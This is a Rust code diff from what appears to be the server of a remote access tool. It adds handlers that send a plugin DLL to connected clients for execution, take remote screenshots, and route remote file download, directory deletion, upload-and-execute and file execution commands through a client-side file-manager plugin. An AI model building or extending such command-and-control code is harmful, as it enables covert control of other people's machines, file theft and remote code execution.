@@ -253,12 +253,22 @@ impl ServerWrapper {
                 }
 
                 TakeScreenshot(addr, display) => {
-                    // self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display))
-                    //     .await
+                    self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display))
+                        .await
+                }
 
-                    let read_plugin_file = std::fs::read("target/release/file_manager.dll").unwrap();
-
-                    self.handle_command(&addr, ClientboundPacket::ExecutePlugin("file_manager".to_string(), read_plugin_file)).await;
+                ExecutePlugin(addr, plugin_name, plugin_path) => {
+                    println!("Executing plugin: {}", plugin_path);
+                    let read_plugin_file = match std::fs::read(&plugin_path) {
+                        Ok(data) => data,
+                        Err(e) => {
+                            eprintln!("Failed to read plugin file {}: {}", plugin_path, e);
+                            return;
+                        }
+                    };
+                
+                    self.handle_command(&addr, ClientboundPacket::ExecutePlugin(plugin_name.clone(), read_plugin_file))
+                        .await;
                 }
 
                 GetProcessList(addr) => {
@@ -318,7 +328,7 @@ impl ServerWrapper {
                 }
 
                 DownloadFile(addr, path) => {
-                    self.handle_command(&addr, ClientboundPacket::DownloadFile(path))
+                    self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::DownloadFile(path))))
                         .await
                 }
 
@@ -332,23 +342,23 @@ impl ServerWrapper {
                         .await
                 }
                 PreviousDir(addr) => {
-                    self.send_client_packet(&addr, ClientboundPacket::PreviousDir)
+                    self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::PreviousDir)))
                         .await
                 }
                 ViewDir(addr, path) => {
-                    self.send_client_packet(&addr, ClientboundPacket::ViewDir(path))
+                    self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::ViewDir(path))))
                         .await
                 }
                 AvailableDisks(addr) => {
-                    self.send_client_packet(&addr, ClientboundPacket::AvailableDisks)
+                    self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::AvailableDisks)))
                         .await
                 }
                 RemoveDir(addr, path) => {
-                    self.send_client_packet(&addr, ClientboundPacket::RemoveDir(path))
+                    self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::RemoveDir(path))))
                         .await
                 }
                 RemoveFile(addr, path) => {
-                    self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path))
+                    self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::RemoveFile(path))))
                         .await
                 }
                 DisconnectClient(addr) => {
@@ -380,21 +390,21 @@ impl ServerWrapper {
                 UploadAndExecute(addr, file_data) => {
                     if let Some(client) = self.connected_users.get(&addr) {
                         self.log_events.log("cmd_sent", format!("Uploading and executing file {} to client [{}] [{}]", file_data.name, addr, client.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::UploadAndExecute(file_data)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::UploadAndExecute(file_data)))).await;
                     }
                 },
                 
                 ExecuteFile(addr, path) => {
                     if let Some(client) = self.connected_users.get(&addr) {
                         self.log_events.log("cmd_sent", format!("Executing file {} on client [{}] [{}]", path, addr, client.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::ExecuteFile(path)))).await;
                     }
                 },
                 
                 UploadFile(addr, target_folder, file_data) => {
                     if let Some(client) = self.connected_users.get(&addr) {
                         self.log_events.log("cmd_sent", format!("Uploading file {} to folder {} on client [{}] [{}]", file_data.name, target_folder, addr, client.username)).await;
-                        self.send_client_packet(&addr, ClientboundPacket::UploadFile(target_folder, file_data)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::RunPlugin("file_manager".to_string(), Box::new(ClientboundPacket::UploadFile(target_folder, file_data)))).await;
                     }
                 },
 
